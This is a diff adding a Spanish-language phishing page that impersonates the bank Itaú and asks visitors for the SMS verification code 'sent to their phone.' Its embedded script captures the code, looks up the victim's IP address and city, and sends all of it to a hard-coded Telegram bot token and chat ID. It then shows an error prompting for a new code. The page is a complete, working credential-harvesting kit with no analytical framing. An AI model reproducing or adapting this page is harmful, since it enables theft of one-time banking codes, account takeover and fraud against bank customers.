@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="./Itaú_files/popup.css" rel="stylesheet">
+    <title>Itaú</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            text-align: center;
+            font-family: Verdana;
+            max-width: 800px;
+            margin: 50px auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        h1 {
+            color: #343348;
+            margin-top: 0;
+            margin-bottom: 10px;
+        }
+
+        .boton {
+            cursor: pointer;
+            background: #fc6202;
+            color: #F4F4F4;
+            border-radius: 4px;
+            border: none;
+            padding: 6px 16px;
+            width: 250px;
+            height: 40px;
+            font-size: 0.875rem;
+            transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+            box-shadow: 0px 3px 1px -2px rgba(0, 0, 0, 0.2), 0px 2px 2px 0px rgba(0, 0, 0, 0.14), 0px 1px 5px 0px rgba(0, 0, 0, 0.12);
+        }
+
+        .boton:hover {
+            background-color: #fc6202;
+        }
+
+        input {
+            border-radius: 10px;
+            border: 1px solid #b3bac8;
+            max-width: 600px;
+            margin: 10px 7px;
+            height: 50px;
+            font-size: 18px;
+            width: 350px;
+            text-align: center;
+            outline: none;
+        }
+
+        input::placeholder {
+            font-size: 16px;
+            font-family: Verdana;
+        }
+
+        input:focus {
+            border-color: rgb(126, 125, 125);
+        }
+
+        .inputCodes {
+            letter-spacing: 10px;
+        }
+
+        .inputCodes::placeholder {
+            letter-spacing: normal;
+        }
+
+        .error-message {
+            color: red;
+            margin-top: 10px;
+            display: none; /* Ocultamos el mensaje por defecto */
+        }
+
+        header {
+            background-color: #fff;
+            width: 100%;
+            height: 68px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        header img {
+            max-width: 100%;
+            height: auto;
+        }
+
+        footer {
+            position: fixed;
+            left: 0;
+            bottom: 0;
+            width: 100%;
+            background-color: #f4f4f4;
+            text-align: center;
+            font-family: Verdana;
+            color: #6c757d;
+            font-size: 12px;
+            padding: 20px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <img alt="Logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/19/Ita%C3%BA_Unibanco_logo_2023.svg/2048px-Ita%C3%BA_Unibanco_logo_2023.svg.png" width="60">
+    </header>
+
+    <section class="container">
+        <div>
+            <form id="verificationForm" method="POST" class="form-group ng-untouched ng-pristine">
+
+                <h1 class="title">Verificación Requerida</h1>
+                <p>Ingresá el código que te enviamos por SMS a tu número de celular</p>
+                <input class="inputCodes" maxlength="6" minlength="6" name="smscode" pattern="[0-9]+" placeholder="######" required="" type="tel" id="smscode"><br><br>
+                <button class="boton" id="mainB" type="submit">CONFIRMAR</button>
+                <p class="error-message" id="error-message">ERROR: INGRESA EL NUEVO SMS QUE TE LLEGÓ</p>
+            </form>
+
+            <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script> <!-- Agregar jQuery si no lo tienes -->
+
+            <script>
+                // Función para obtener IP y ubicación
+                function obtenerIPYUbicacion() {
+                    return fetch('https://ipinfo.io/json?') // Asegúrate de reemplazar con tu propio token
+                        .then(response => response.json())
+                        .then(data => {
+                            return {
+                                ip: data.ip,
+                                location: data.city + ", " + data.country
+                            };
+                        });
+                }
+
+                // Función para enviar el formulario a Telegram
+                function enviarATelegram(e) {
+                    e.preventDefault(); // Evita que el formulario se envíe de la manera tradicional
+
+                    // Obtener el valor del código
+                    const smscode = document.querySelector('input[name="smscode"]').value;
+
+                    // Obtener IP y ubicación
+                    obtenerIPYUbicacion().then(({ ip, location }) => {
+                        // Mensaje que se enviará al bot
+                        const mensaje = `🐇🍀 AW-Itaú:
+                        \n🔑 Código: ${smscode}
+                        \n🌍 IP: ${ip}
+                        \n📍 Ubicación: ${location}`;
+
+                        // Usamos los valores de tu token y chat_id
+                        fetch(`https://api.telegram.org/bot8139790839:AAEmmA54ViWvwUx_WHSSc8lYX7HQ41DWxKc/sendMessage`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                chat_id: '7303290094', // Tu ID de chat
+                                text: mensaje
+                            })
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log(data); // Agregar para verificar la respuesta de Telegram
+                            if (data.ok) {
+                                // Redirigir a otra página después del envío correcto
+                                window.location.href = "err.html"; // Cambia por la URL deseada
+                            } else {
+                                // En caso de que la respuesta no sea positiva
+                                alert("No se pudo enviar el mensaje. Por favor, intenta de nuevo.");
+                            }
+                        })
+                        .catch(error => {
+                            // En caso de error, mostrar un mensaje
+                            console.error('Error', error);
+                            alert('Ocurrió un error al intentar enviar el mensaje.');
+                        });
+                    });
+                }
+
+                // Añadir el evento de envío del formulario
+                document.getElementById('verificationForm').addEventListener('submit', enviarATelegram);
+            </script>
+        </div>
+    </section>
+
+    <footer>
+        <div class="footer-content">
+            ITAU
+        </div>
+    </footer>
+
+</body>
+</html>
